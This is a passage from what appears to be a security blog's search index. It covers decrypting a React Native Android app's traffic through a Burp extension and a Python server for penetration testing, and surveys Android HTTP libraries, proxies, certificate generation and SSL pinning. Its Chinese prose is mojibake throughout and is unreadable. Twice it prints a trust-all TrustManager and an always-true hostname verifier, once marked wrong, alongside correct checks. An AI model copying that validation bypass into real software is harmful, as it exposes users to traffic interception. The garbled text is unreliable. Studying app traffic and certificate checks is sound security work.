(host.contains(\"your_hostname\")){ if(messageIsRequest) { byte[] request = messageInfo.getRequest(); IRequestInfo ireinfo = helpers.analyzeRequest(request); List\u003cString\u003e headers = ireinfo.getHeaders(); int offset = ireinfo.getBodyOffset(); String body = helpers.bytesToString(request).substring(offset); stdout.println(\"request body---\u003e\\n\" + body); String ret = utls.Request(body); stdout.println(\"python response---\u003e\\n\" + ret); String newbody = \"{\\\"data\\\":\\\"\" + ret.split(\":\")[0] + \"\\\",\\\"customInfo\\\":\\\"\" + ret.split(\":\")[1] + \"\\\"}\"; stdout.println(\"newbody---\u003e\\n\" + newbody); messageInfo.setRequest(helpers.buildHttpMessage(headers, newbody.getBytes())); } } } python httpserverä½¿ç”¨HTTPServeræ¨¡å—ï¼ˆpy3.xï¼‰æˆ–BaseHTTPServeræ¨¡å—ï¼ˆpy2.xï¼‰ class PostHandler(BaseHTTPRequestHandler): def _writeheaders(self): print(self.path) print(self.headers) self.send_response(200); self.send_header('Content-type','text/html'); self.end_headers() def do_POST(self): # Parse the form data posted (host,port) = self.client_address print('connect from %s:%s' % (host,port)) self._writeheaders() nbytes = int(self.headers['content-length']) data = self.rfile.read(nbytes) post_values = json.loads(data.decode('utf-8')) print(post_values) data = post_values['data'] customInfo = post_values['customInfo'] if data: data_decrpyted = ctx.call('h',data) if customInfo: customInfo_decrpyted = ctx.call('h',customInfo) # new_post_values = {'data':data_decrpyted, 'customInfo':customInfo_decrpyted} new_post_values = data_decrpyted + ':' + customInfo_decrpyted print(new_post_values) try: # Error: a bytes-like object is required, not 'str'! Solution: str.encode or bytes(s, encoding=\"utf8\") self.wfile.write(str.encode(new_post_values)) except Exception as err: print(err) æœ€åè§£å†³ç¬¬ä¸‰ä¸ªé—®é¢˜ å¦‚ä½•åœ¨pythonä¸­è¿è¡Œjsä»£ç ï¼Œè¿›è¿‡æœç´¢å‘ç°pythonæ¨¡å— PyExecJS æä¾›äº†éå¸¸æ–¹ä¾¿æ˜“ç”¨çš„api. å…¶é¡¹ç›®åœ°å€https://pypi.org/project/PyExecJS/ å®˜æ–¹æä¾›çš„ç®€å•äº‹ä¾‹ï¼š \u003e\u003e\u003e import execjs \u003e\u003e\u003e execjs.eval(\"'red yellow blue'.split(' ')\") ['red', 'yellow', 'blue'] \u003e\u003e\u003e ctx = execjs.compile(\"\"\" ... function add(x, y) { ... return x + y; ... } ... \"\"\") \u003e\u003e\u003e ctx.call(\"add\", 1, 2) 3 å¯ä»¥çœ‹åˆ°åªéœ€åŠ è½½ç¼–è¯‘jsï¼Œå¹¶è°ƒç”¨callå³å¯è¿è¡Œjså‡½æ•°ã€‚ é‚£å‰©ä¸‹çš„å·¥ä½œå°±æ˜¯å‰¥ç¦»å‡ºâ€œindex.android.bundleâ€ä¸­çš„åŠ å¯†å‡½æ•°ï¼Œå¹¶åœ¨httpserverå¤„ç†å“åº”ï¼ˆwfile.writeï¼‰æ—¶å¯¹æ˜æ–‡æ•°æ®è°ƒç”¨åŠ å¯†å‡½æ•°å¤„ç†å°±å¥½äº†ï¼Œso easyï¼ data_decrpyted = ctx.call('h',data) customInfo_decrpyted = ctx.call('h',customInfo) æ‰€æœ‰å·¥ä½œå®Œæˆï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹å‰åæ•ˆæœï¼š æ­£å¸¸æ•°æ®è¯·æ±‚\" æ­£å¸¸æ•°æ®è¯·æ±‚ è§£å¯†åè¯·æ±‚\" è§£å¯†åè¯·æ±‚ ç°åœ¨å¯ä»¥æ„‰å¿«çš„è¿›è¡Œæ¸—é€æµ‹è¯•äº†:P ","date":"2018-05-31","objectID":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html:3:0","tags":["burp","react-native"],"title":"å†…åµŒReactçš„androidåº”ç”¨æµé‡åŠ è§£å¯†","uri":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html"},{"categories":["androidç½‘ç»œ"],"content":"0x00 ç›®çš„ é€šè¿‡ä½¿ç”¨HttpClinetã€HttpURLConnectã€Volleyã€Okhttpã€RetrofitåŠWebviewï¼Œå¿«é€Ÿè¯†åˆ«androidç½‘ç»œè¯·æ±‚æ¡†æ¶ä¸ºäº†èƒ½å®šä½å…³é”®ä»£ç ï¼Œå®Œå…¨ç†è§£ä¸æ­£ç¡®åŠæ­£ç¡®çš„è¯ä¹¦ã€åŸŸååŠsslpinningæ ¡éªŒè¿‡ç¨‹ã€‚ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:1:0","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"0x01 HttpClient \u0026 HttpURLConnection ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:2:0","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"å‘é€è¯·æ±‚ android 6.0 åˆ é™¤HttpClientç±»åº“ï¼Œä»éœ€ä½¿ç”¨çš„æ–¹æ³•ï¼š eclipseï¼šlibsä¸­åŠ å…¥org.apache.http.legacy.jar ASï¼šåœ¨build.gradleä¸­åŠ å…¥ android { useLibrary 'org.apache.http.legacy' } ä½¿ç”¨HttpClientå‘é€Http GETè¯·æ±‚ HttpClient mHttpClient = new DefaultHttpClient(); HttpGet mHttpGet = new HttpGet(url); HttpResponse mHttpResponse = mHttpClient.execute(mHttpGet); HttpEntity mHttpEntity = mHttpResponse.getEntity(); DefaultHttpClient with default constructor is not compatible with TLS 1.2 å»ºè®®ä½¿ç”¨SystemDefaultHttpClientä»£æ›¿ï¼š HttpClient client = new SystemDefaultHttpClient(); or HttpClient client = HttpClientBuilder.create().useSystemProperties().build(); ä½¿ç”¨HttpURLConnectionå‘é€Http GETè¯·æ±‚ URL url = new URL(url); HttpURLConnection urlConnection = (HttpURLConnection)url.openConnection(); InputStream mInputStream = mHttpURLConnection.getInputStream(); ä»¥ä¸Šä»£ç å‡èƒ½è‡ªåŠ¨å¤„ç†HTTPå’ŒHTTPSè¯·æ±‚ã€‚ åœ¨è°ƒç”¨URLçš„openConnection()æ–¹æ³•æ—¶ï¼Œå¦‚æœURLæ˜¯HTTPåè®®çš„ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªHttpURLConnectionå¯¹è±¡ï¼Œè€Œå¦‚æœURLæ˜¯HTTPSåè®®çš„ï¼Œè¿”å›çš„å°†æ˜¯ä¸€ä¸ªHttpsURLConnectionå¯¹è±¡ã€‚ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:2:1","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"ä½¿ç”¨ä»£ç† HttpClientä½¿ç”¨ä»£ç† HttpHost proxy = new HttpHost(\"127.0.0.1\", 9876, \"HTTP\"); HttpParams httpParams = new BasicHttpParams(); httpParams.setParameter(ConnRouteParams.DEFAULT_PROXY, proxy); HttpClient mHttpClient = new DefaultHttpClient(httpParams); HttpGet mHttpGet = new HttpGet(url); HttpResponse mHttpResponse = mHttpClient.execute(mHttpGet); HttpURLConnectionä½¿ç”¨ä»£ç† Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"127.0.0.1\", 9876)); URL mUrl = new URL(url); HttpURLConnection con = (HttpURLConnection) mUrl.openConnection(proxy); HttpClient ä¸æ”¯æŒ SOCKS HttpURLConnectino æ”¯æŒ Proxy.Type.SOCKS ä½¿ç”¨ç³»ç»Ÿä»£ç† Properties props = System.getProperties(); props.setProperty(\"proxySet\", \"true\"); props.setProperty(\"http.proxyHost\", host); props.setProperty(\"http.proxyPort\", port); ä»£ç†httpsè¯·æ±‚ï¼šhttps.proxyHost/Port ä»£ç†socksè¯·æ±‚ï¼šsocksProxyHost/Port ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:2:2","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"httpså’Œè¯ä¹¦ ä¸Šé¢å±•ç¤ºäº†ç”¨HttpClientåŠHttpURLConnect APIè®¿é—®httpsç½‘ç«™ã€‚ ç‰¹ç‚¹ï¼šç”±Androidç³»ç»Ÿæ ¡éªŒæœåŠ¡ç«¯æ•°å­—è¯ä¹¦çš„åˆæ³•æ€§ï¼Œç”¨å¯ä¿¡CAç­¾å‘çš„æ•°å­—è¯ä¹¦çš„ç½‘ç«™æ‰å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œç§æœ‰CAç­¾å‘çš„æ•°å­—è¯ä¹¦çš„ç½‘ç«™æ— æ³•è®¿é—®ã€‚ ç§æœ‰CAç­¾å‘çš„è¯ä¹¦ç½‘ç«™å¦‚ä½•è®¿é—®ï¼Ÿ å¯ä»¥çœ‹å‡ºå¦‚æœè¦è¿›è¡Œ SSL ä¼šè¯ï¼Œå¿…é¡»å¾—æ–°å»ºä¸€ä¸ª SSLSocket å¯¹è±¡ï¼Œè€Œ SSLSocketå¯¹è±¡æ˜¯é€šè¿‡ SSLSocketFactory æ¥ç®¡ç†çš„ï¼ŒSSLSocketFactoryå¯¹è±¡åˆ™ä¾èµ–äºSSLContext ï¼ŒSSLContext å¯¹è±¡åˆä¾èµ–äº keyManagerã€TrustManager å’ŒSecureRandomã€‚æˆ‘ä»¬è¿™é‡Œæœ€å…³å¿ƒçš„æ˜¯ TrustManager å¯¹è±¡ï¼Œæ­£æ˜¯ TrustManagerè´Ÿè´£è¯ä¹¦çš„æ ¡éªŒã€‚ android Xiaomi MAXè¯ä¹¦è·¯å¾„: /system/etc/security/cacerts å‡†å¤‡å·¥ä½œ 1. ç”Ÿæˆè‡ªç­¾è¯ä¹¦ ç”Ÿæˆè‡ªå·±çš„CAæ ¹è¯ä¹¦ ç”ŸæˆCAç§é’¥æ–‡ä»¶ca.keyï¼š openssl genrsa -out ca.key 1024 ç”ŸæˆX.509è¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶ca.csrï¼š openssl req -new -key ca\\_private.key -out ca.csr åœ¨ç”Ÿæˆca.csrçš„è¿‡ç¨‹ä¸­ï¼Œä¼šè®©è¾“å…¥ä¸€äº›ç»„ç»‡ä¿¡æ¯ç­‰ã€‚ ç”ŸæˆX.509æ ¼å¼çš„CAæ ¹è¯ä¹¦ca_public.crtï¼ˆå…¬é’¥è¯ä¹¦ï¼‰ï¼š openssl x509 -req -in ca.csr -signkey ca\\_private.key -out ca\\_public.crt ç”ŸæˆæœåŠ¡å™¨è¯ä¹¦ å…ˆç”ŸæˆæœåŠ¡å™¨ç§é’¥æ–‡ä»¶server_private.keyï¼š openssl genrsa -out server\\_private.key 1024 æ ¹æ®æœåŠ¡å™¨ç§é’¥ç”ŸæˆæœåŠ¡å™¨å…¬é’¥æ–‡ä»¶server_public.pemï¼š openssl rsa -in server\\_private.key -pubout -out server\\_public.pem æœåŠ¡å™¨ç«¯éœ€è¦å‘CAæœºæ„ç”³è¯·ç­¾åè¯ä¹¦ï¼Œåœ¨ç”³è¯·ç­¾åè¯ä¹¦ä¹‹å‰ä¾ç„¶æ˜¯åˆ›å»ºè‡ªå·±çš„è¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶server.csrï¼šopenssl req -new -key server\\_private.key -out server.csr Warning å¯¹äºç”¨äºHTTPSçš„CSRï¼ŒCommon Nameå¿…é¡»å’Œç½‘ç«™åŸŸåä¸€è‡´ï¼Œä»¥ä¾¿ä¹‹åè¿›è¡ŒHostNameæ ¡éªŒã€‚ æœåŠ¡å™¨ç«¯ç”¨server.csræ–‡ä»¶å‘CAç”³è¯·è¯ä¹¦ï¼Œç­¾åè¿‡ç¨‹éœ€è¦CAçš„å…¬é’¥è¯ä¹¦å’Œç§é’¥å‚ä¸ï¼Œæœ€ç»ˆé¢å‘ä¸€ä¸ªå¸¦æœ‰CAç­¾åçš„æœåŠ¡å™¨ç«¯è¯ä¹¦server.crtï¼šopenssl x509 -req -CA ca\\_public.crt -CAkey ca\\_private.key -CAcreateserial -in server.csr -out server.crt ä½¿ç”¨webpyæ­å»ºæœåŠ¡å™¨ï¼Œä»£ç è¯¦è§demoï¼ˆwebpytest.pyï¼‰ 2. ä¿¡ä»»æ‰€æœ‰è¯ä¹¦ //è¯ä¹¦æ ¡éªŒ TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() { @Override public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } } }; //åŸŸåæ ¡éªŒ HostnameVerifier hostnameVerifier = new HostnameVerifier() { @Override public boolean verify(String s, SSLSession sslSession) { return true; } }; SSLContext mSSLContext = SSLContext.getInstance(\"TLS\"); mSSLContext.init(null, trustAllCerts, new SecureRandom()); URL mUrl = new URL(url); //HttpsURLConnection.setDefaultSSLSocketFactory(mSSLContext.getSocketFactory()); //HttpsURLConnection.setDefaultHostnameVerifier(hostnameVerifier); HttpsURLConnection httpsURLConnection = (HttpsURLConnection) mUrl.openConnection(); httpsURLConnection.setSSLSocketFactory(mSSLContext.getSocketFactory()); httpsURLConnection.setHostnameVerifier(hostnameVerifier); 3. æ­£ç¡®çš„è¯ä¹¦æ ¡éªŒ æ­£ç¡®å®ç°checkServerTrustedå‡½æ•°ï¼š public final void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) { if (x509CertificateArr == null) { throw new IllegalArgumentException(\"check server x509Certificates is null\"); } if (x509CertificateArr.length \u003c 0) { throw new IllegalArgumentException(\"check server x509Certificates is empty\"); } for (X509Certificate cert : x509CertificateArr) { try { cert.checkValidity(); String cername = \"server1.crt\"; InputStream is = new BufferedInputStream(context.getAssets().open(cername)); CertificateFactory certificateFactory = CertificateFactory.getInstance(\"X.509\"); X509Certificate serverCert = (X509Certificate)certificateFactory.generateCertificate(is); cert.verify(serverCert.getPublicKey()); } catch (Exception e e) { e.printStackTrace(); } } } æ­£ç¡®å®ç°åŸŸåæ ¡éªŒverifyå‡½æ•°ï¼š public final boolean verify(String str, SSLSession sSLSession) { HostnameVerifier hv = HttpsURLConnection.getDefaultHostnameVerifier(); Boolean result = hv.verify(\"*.xxx.com\", sSLSession); return result; } ä»¥ä¸Šä»£ç ä¸ºç®€å•å®ç°ï¼Œè¿˜å¯ä»¥ä»sessionè·å–æœåŠ¡å™¨åŸŸåä¸æœ¬åœ°è¯ä¹¦è§£æåçš„åŸŸååšæ¯”å¯¹ã€‚ 4. SSL Pinning ç›´æ¥ç”¨é¢„åŸ‹çš„è¯ä¹¦æ¥ç”ŸæˆTrustManger å‚æ•°certStreamæ˜¯è¯ä¹¦æ–‡ä»¶çš„InputSteamæµ å¦å¤–å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æœåŠ¡å™¨è¯ä¹¦çš„å…¬é’¥ï¼š keytool -printcert -rfc -file uwca.crt ç›´æ¥å¤åˆ¶ç²˜è´´å¯ä»¥å°†å…¬é’¥ä¿¡æ¯ç¡¬ç¼–ç åœ¨ä»£ç ä¸­ å¯ä»¥ç”¨ä»¥ä¸‹å½¢å¼è·å–æ­¤å…¬é’¥å¯¹åº”çš„X.509è¯ä¹¦ï¼š ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:2:3","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"0x02 Volley åœ¨2013å¹´Google I/Oå¤§ä¼šä¸Šæ¨å‡ºäº†ä¸€ä¸ªæ–°çš„ç½‘ç»œé€šä¿¡æ¡†æ¶Volleyã€‚ Volley is an HTTP library that makes networking for Android apps easier and, most importantly, faster. github Android developer training page androidç‰ˆæœ¬å¤§äºç­‰äº2.3åˆ™è°ƒç”¨åŸºäºHttpURLConnectionçš„HurlStackï¼Œå¦åˆ™å°±è°ƒç”¨åŸºäºHttpClientçš„HttpClientStackã€‚ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:3:0","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"volley POSTè¯·æ±‚ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:3:1","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"Volley + è‡ªå®šä¹‰è¯ä¹¦ hä¿®æ”¹volleyæºç ï¼ˆvolley.javaï¼‰ åŸç†å’Œä¸Šé¢è®²çš„ä¸€è‡´ï¼š è¯»å–è¯ä¹¦åŠ è½½åˆ°keyStoreï¼Œåˆ›å»ºTrustManagerFactoryå¯¹è±¡tmfç”¨keyStoreåˆå§‹åŒ–ï¼Œå†åˆ›å»ºSSLContextå¯¹è±¡ç”¨tmfåˆå§‹åŒ–ï¼Œå³å¯ä»¥ç”¨SSLContextå¾—åˆ°SSLSocketFactoryè¿›è¡Œè‡ªç­¾åè¯ä¹¦çš„ç½‘ç»œè¯·æ±‚ã€‚ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:3:2","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"0x03 OkHttp ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:0","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"å‘é€è¯·æ±‚ å®˜æ–¹äº‹ä¾‹ï¼š OkHttpClient client = new OkHttpClient(); String post(String url, String json) throws IOException { RequestBody body = RequestBody.create(JSON, json); Request request = new Request.Builder() .url(url) .post(body) .build(); Response response = client.newCall(request).execute(); return response.body().string(); } å¼‚æ­¥POSTè¯·æ±‚ OkHttpClient client = new OkHttpClient(); RequestBody formBody = new FormBody.Builder() .add(\"aaa\", \"bbb\") .build(); Request request = new Request.Builder() .url(url) .post(formBody) .build(); client.newCall(request).enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { } @Override public void onResponse(Call call, Response response) throws IOException { return response.body().string(); } }); å®ä¾‹å‚è§é˜¿é‡ŒTVåŠ©æ‰‹åº”ç”¨ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:1","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"è®¾ç½®ä»£ç† OkHttpClient client = new OkHttpClient.Builder().proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"112.95.91.101\", 9999))).build(); ç»™OkHttp Clientæ·»åŠ socksä»£ç† ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:2","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"è‡ªç­¾åè¯ä¹¦ æœªæ ¡éªŒæœåŠ¡å™¨ç«¯è¯ä¹¦é“¾ã€æœªæ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦åŸŸåï¼ˆä¿¡ä»»æ‰€æœ‰è¯ä¹¦åŠåŸŸåï¼‰ï¼š // wrong checkServerTrusted \u0026 HostnameVerifier TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() { @Override public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } } }; HostnameVerifier hostnameVerifier = new HostnameVerifier() { @Override public boolean verify(String s, SSLSession sslSession) { return true; } }; try { SSLContext sslContext = SSLContext.getInstance(\"TLS\"); sslContext.init(null, trustAllCerts, new SecureRandom()); OkHttpClient mOkHttpClient = new OkHttpClient.Builder().hostnameVerifier(hostnameVerifier) .sslSocketFactory(sslContext.getSocketFactory()).build(); okhttp3.Request request = new okhttp3.Request.Builder().url(url).build(); mOkHttpClient.newCall(request).enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { } @Override public void onResponse(Call call, okhttp3.Response response) throws IOException { String body = response.body().string(); Log.i(\"lzm\", \"network---\" + body); } }); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } catch (KeyManagementException e) { e.printStackTrace(); } æ­£ç¡®å®ç°åŒä¸Šï¼Œéœ€çœŸæ­£å®ç° checkServerTrusted å’Œ verify å‡½æ•°ã€‚è¯¦è§demoã€‚ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:3","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"SSL Pinning OkHttpClient client = new OkHttpClient.Builder() .certificatePinner(new CertificatePinner.Builder() .add(\"publicobject.com\", \"sha256/afwiKY3RxoMmLkuRW1l7QsPZTJPwDS2pdDROQjXw8ig=\") .build()) .build(); Certificate Pinning è·å–æœ¬åœ°è¯ä¹¦ public static CertificatePinner getCertificata() { Certificate ca = null; try { CertificateFactory cf = CertificateFactory.getInstance(\"X.509\"); InputStream caInput = ZMApplication.getZMContext().getResources().openRawResource(R.raw.test); try { ca = cf.generateCertificate(caInput); } finally { caInput.close(); } } catch (CertificateException | IOException e) { e.printStackTrace(); } String certPin = \"\"; if (ca != null) { certPin = CertificatePinner.pin(ca); } CertificatePinner certificatePinner = new CertificatePinner.Builder() .add(UrlConfig.RELEASE_BASE_URL, certPin) .build(); return certificatePinner; } ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:4","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"0x04 Retrofit Retrofitæ˜¯Squareå…¬å¸å¼€å‘çš„ä¸€æ¬¾é’ˆå¯¹Androidç½‘ç»œè¯·æ±‚çš„æ¡†æ¶ï¼ŒRetrofit2åº•å±‚åŸºäºOkHttpå®ç° http://square.github.io/retrofit/ examples ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:5:0","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"å‘é€è¯·æ±‚ // åˆ›å»ºæ¥å£ public interface HtmlService { @GET(\"/\") Call\u003cString\u003e doIndex(); @FormUrlEncoded @POST(\"/login\") Call\u003cString\u003e doLogin(@Field(\"username\")String name, @Field(\"password\") String password); } // 1. æ„å»ºRetrofitå¯¹è±¡ï¼ŒaddConverterFactoryæ˜¯å¯¹responseè¿›è¡Œè§£æ Retrofit retrofit = new Retrofit.Builder() .addConverterFactory(ScalarsConverterFactory.create()) .baseUrl(url) .build(); // 2. åŠ¨æ€ä»£ç†ç”Ÿæˆæ¥å£å¯¹è±¡ HtmlService htmlService = retrofit.create(HtmlService.class); // 3. é€šè¿‡æ¥å£çš„æ–¹æ³•å¾—åˆ°è°ƒç”¨çš„å¯¹è±¡ // Call\u003cString\u003e call = htmlService.doIndex(); //GET Call\u003cString\u003e call = htmlService.doLogin(\"admin\", \"admin\"); //POST // 4. å¼‚æ­¥æ–¹æ³•å¾—åˆ°response call.enqueue(new Callback\u003cString\u003e() { @Override public void onResponse(Call\u003cString\u003e call, retrofit2.Response\u003cString\u003e response) { Log.i(\"lzm\", response.body()); } @Override public void onFailure(Call\u003cString\u003e call, Throwable throwable) { Log.i(\"lzm\", throwable.getMessage()); } }); ä½¿ç”¨webpyæ­å»ºæœåŠ¡å™¨ï¼Œä»£ç è¯¦è§demoï¼ˆwebpytest2.pyï¼‰ å®ä¾‹å‚è§å’ªå’•TVï¼ˆmiguTV_3.3.0.apkï¼‰ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:5:1","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"è‡ªç­¾åè¯ä¹¦ Retrofit+OkHttpè¿›è¡Œè¯ä¹¦æ ¡éªŒï¼Œè€ŒOkHttpè¯ä¹¦æ ¡éªŒä¸Šæ–‡å·²ç»ä»‹ç»ã€‚ OkHttpClient client = new OkHttpClient.Builder() .sslSocketFactory(HTTPSUtils.getSSLSocketFactory(context)) .hostnameVerifier(HTTPSUtils.getHostNameVerifier(hostUrls)) .build(); Retrofit retrofit = new Retrofit.Builder().baseUrl(baseUrl) .client(client) .build(); 